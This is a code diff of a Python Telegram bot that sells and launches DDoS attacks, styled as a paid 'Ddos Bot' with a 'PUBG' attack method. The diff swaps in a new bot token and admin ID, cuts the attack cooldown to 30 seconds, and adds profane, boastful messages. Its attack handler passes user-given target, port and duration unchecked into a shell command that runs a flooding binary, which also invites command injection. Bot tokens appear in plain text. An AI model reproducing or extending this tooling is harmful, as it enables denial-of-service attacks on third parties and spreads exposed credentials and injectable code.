@@ -7,10 +7,10 @@ import datetime
 import os
 
 # insert your Telegram bot token here
-bot = telebot.TeleBot('6985771977:AAHs45lBA9nZ93YsOjhr0LPxjsb6UMctdsg')
+bot = telebot.TeleBot('6756889023:AAEf8JKzDk7xXdhfU2cDXEodhoP96zJu1ok')
 
 # Admin user IDs
-admin_id = ["6159360725"]
+admin_id = ["7116654041"]
 
 # File to store allowed user IDs
 USER_FILE = "users.txt"
@@ -120,14 +120,14 @@ def remove_user(message):
                 with open(USER_FILE, "w") as file:
                     for user_id in allowed_user_ids:
                         file.write(f"{user_id}\n")
-                response = f"User {user_to_remove} removed successfully."
+                response = f"User {user_to_remove} removed successfully.❗"
             else:
                 response = f"User {user_to_remove} not found in the list."
         else:
             response = '''Please Specify A User ID to Remove. 
  Usage: /remove <userid>'''
     else:
-        response = "Only Admin Can Run This Command."
+        response = "Only Admin Can Run This Command❗."
 
     bot.reply_to(message, response)
 
@@ -143,7 +143,7 @@ def clear_logs_command(message):
                     response = "Logs are already cleared. No data found."
                 else:
                     file.truncate(0)
-                    response = "Logs Cleared Successfully"
+                    response = "Logs Cleared Successfully✌"
         except FileNotFoundError:
             response = "Logs are already cleared."
     else:
@@ -207,7 +207,7 @@ def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
     
-    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: PUBG\n By @ANONYMOUS_PK"
+    response = f" 📡 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃 ⚡.\n\n🎯𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n🔌𝐏𝐨𝐫𝐭: {port}\n⏳𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n🚬𝐌𝐞𝐭𝐡𝐨𝐝: PUBG\n  By @ANONYMOUS_PK"
     bot.reply_to(message, response)
 
 # Dictionary to store the last time each user ran the /pubg command
@@ -223,8 +223,8 @@ def handle_pubg(message):
         # Check if the user is in admin_id (admins have no cooldown)
         if user_id not in admin_id:
             # Check if the user has run the command before and is still within the cooldown period
-            if user_id in pubg_cooldown and (datetime.datetime.now() - pubg_cooldown[user_id]).seconds < 300:
-                response = "You Are On Cooldown. Please Wait 5min Before Running The /pubg Command Again."
+            if user_id in pubg_cooldown and (datetime.datetime.now() - pubg_cooldown[user_id]).seconds < 30:
+                response = "You Are On Cooldown. Please Wait 30 seconds Before Running The /pubg Command Again."
                 bot.reply_to(message, response)
                 return
             # Update the last time the user ran the command
@@ -243,11 +243,11 @@ def handle_pubg(message):
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                 full_command = f"./pubg {target} {port} {time} 500"
                 subprocess.run(full_command, shell=True)
-                response = f"Attack Finished. Target: {target} Port: {port} Time: {time}"
+                response = f"Attack Finished. Target: {target} Port: {port} Time: {time} 🚬"
         else:
             response = "Usage :- /pubg <target> <port> <time>\n"  # Updated command syntax
     else:
-        response = "You Are Not Authorized To Use This Command.\n"
+        response = "You Are Not Authorized To Use This Command 🙁.\n"
 
     bot.reply_to(message, response)
 
@@ -299,7 +299,7 @@ def show_help(message):
 @bot.message_handler(commands=['start'])
 def welcome_start(message):
     user_name = message.from_user.first_name
-    response = f"Welcome to Your Home, {user_name}! Feel Free to Explore.\nTry To Run This Command : /help\nWelcome To The World's Best Ddos Bot\n"
+    response = f"Welcome {user_name}! \nTry To Run This Command : /help\n Lets F*ck that motherf*cker so HARD ❗⚡\n"
     bot.reply_to(message, response)
 
 
@@ -308,16 +308,14 @@ def welcome_rules(message):
     user_name = message.from_user.first_name
     response = f'''{user_name} Please Follow These Rules:
 
-1. Dont Run Too Many Attacks !! Cause A Ban From Bot
-2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot. 
-3. We Daily Checks The Logs So Follow these rules to avoid Ban!!
+1 : NO FU*KING RULES FOR MY EVIL OWNER MAFIA 😈
 '''
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['plan'])
 def welcome_plan(message):
     user_name = message.from_user.first_name
-    response = f'''{user_name}, Brother , Only 1 Plan Is Powerfull Then Any Other Ddos !!:
+    response = f'''{user_name}, Only 1 Plan Is Powerfull Then Any Other Ddos !!:
 
 Vip :
 -> Attack Time : 200 (S)
@@ -325,9 +323,9 @@ Vip :
 -> Concurrents Attack : 300
 
 Pr-ice List:
-Day-->150 Rs
-Week-->900 Rs
-Month-->1600 Rs
+🔸Day-->100 BILLION DOLLARS💲
+🔹Week-->900M BITCOINS 
+🔸Month-->1600M BITCOINS 
 '''
     bot.reply_to(message, response)
 
